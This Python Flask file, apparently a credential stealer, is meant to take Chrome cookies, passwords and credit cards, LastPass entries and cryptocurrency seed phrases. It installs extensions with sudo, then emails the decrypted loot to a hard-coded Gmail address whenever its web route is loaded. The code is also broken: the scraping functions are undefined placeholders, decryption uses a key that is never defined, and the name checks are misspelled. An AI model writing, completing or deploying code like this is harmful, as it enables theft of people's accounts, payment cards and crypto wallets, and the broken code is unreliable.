app.py
from flask import Flask
import os
import subprocess
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Function to encrypt data
def encrypt_data(data):
    key = os.urandom(32)  # Generate a random 256-bit key
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(cipher.iv + ciphertext).decode('utf-8')

# Function to decrypt data
def decrypt_data(encrypted_data):
    encrypted_data = base64.b64decode(encrypted_data.encode('utf-8'))
    iv = encrypted_data[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data[AES.block_size:]), AES.block_size)
    return decrypted_data.decode('utf-8')

# Function to install browser extensions
def install_extensions():
    # Install Cookie Quick Manager (replace with actual installation command)
    subprocess.run(["sudo", "apt-get", "install", "cookie-quick-manager"])
    # Install Lastpass (replace with actual installation command)
    subprocess.run(["sudo", "apt-get", "install", "lastpass"])
    # Install the cryptocurrency wallet extension (replace with actual installation command)
    subprocess.run(["sudo", "apt-get", "install", "cryptocurrency-wallet-extension"])

# Function to scrape data from Chrome
def scrape_chrome_data():
    # Use Chrome extension APIs to access and scrape data
    # (replace with actual scraping code)
    cookies = get_cookies_from_chrome()
    passwords = get_passwords_from_chrome()
    credit_cards = get_credit_cards_from_chrome()
    # Store the scraped data in a file
    data = "Cookies:\n" + cookies + "\nPasswords:\n" + passwords + "\nCredit Cards:\n" + credit_cards
    encrypted_data = encrypt_data(data)
    with open("chrome_scraped_data.txt", "w") as file:
        file.write(encrypted_data)

# Function to scrape data from Lastpass
def scrape_lastpass_data():
    # Use Lastpass extension APIs to access and scrape data
    # (replace with actual scraping code)
    passwords = get_passwords_from_lastpass()
    credit_cards = get_credit_cards_from_lastpass()
    # Store the scraped data in a file
    data = "Passwords:\n" + passwords + "\nCredit Cards:\n" + credit_cards
    encrypted_data = encrypt_data(data)
    with open("lastpass_scraped_data.txt", "w") as file:
        file.write(encrypted_data)

# Function to scrape cryptocurrency wallet data
def scrape_crypto_data():
    # Use the cryptocurrency wallet extension APIs to access and scrape data
    # (replace with actual scraping code)
    wallet_address = get_wallet_address_from_extension()
    seed_phrase = get_seed_phrase_from_extension()
    # Store the scraped data in a file
    data = "Wallet Address:\n" + wallet_address + "\nSeed Phrase:\n" + seed_phrase
    encrypted_data = encrypt_data(data)
    with open("crypto_scraped_data.txt", "w") as file:
        file.write(encrypted_data)

# Function to send the scraped data to your email
def send_email(file_path, recipient_email, data):
    sender_email = "your_email@example.com"
    password = "your_email_password"

    # Create a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient_email
    message["Subject"] = "Scraped Data"

    # Attach the data to the message
    message.attach(MIMEText(data, "plain"))

    # Send the email
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient_email, message.as_string())

# Main function
def main():
    install_extensions()
    scrape_chrome_data()
    scrape_lastpass_data()
    scrape_crypto_data()

    with open("chrome_scraped_data.txt", "r") as file:
        encrypted_data = file.read()
    decrypted_data = decrypt_data(encrypted_data)
    send_email("chrome_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)

    with open("lastpass_scraped_data.txt", "r") as file:
        encrypted_data = file.read()
    decrypted_data = decrypt_data(encrypted_data)
    send_email("lastpass_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)

    with open("crypto_scraped_data.txt", "r") as file:
        encrypted_data = file.read()
    decrypted_data = decrypt_data(encrypted_data)
    send_email("crypto_scraped_data.txt", "myrdpa@gmail.com", decrypted_data)

app = Flask(_name_)

@app.route('/')
def run_script():
    # Call the main function of the script
    main()
    return "Script executed successfully"

if _name_ == '_main_':
    app.run()